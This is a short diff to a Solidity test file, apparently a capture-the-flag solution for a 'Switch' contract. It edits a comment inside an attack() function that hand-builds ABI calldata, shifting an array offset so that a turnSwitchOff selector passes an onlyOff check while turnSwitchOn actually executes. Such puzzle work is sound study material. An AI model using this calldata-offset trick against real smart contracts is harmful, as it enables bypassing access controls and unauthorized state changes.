@@ -34,7 +34,7 @@ contract SwitchTest is Test {
     function attack() private {
         bytes memory data = abi.encode(
             uint256(0x60), // sets array offset to our desired location
-            uint256(0x00), // ignored, can be all zeros
+            uint256(0x00), // ignored, can be all zeros; would be 4 normally
             Switch.turnSwitchOff.selector, // checked by `onlyOff` in assembly
             uint256(0x04), // offset points here as length, 4 bytes
             Switch.turnSwitchOn.selector // actual value in 4 bytes
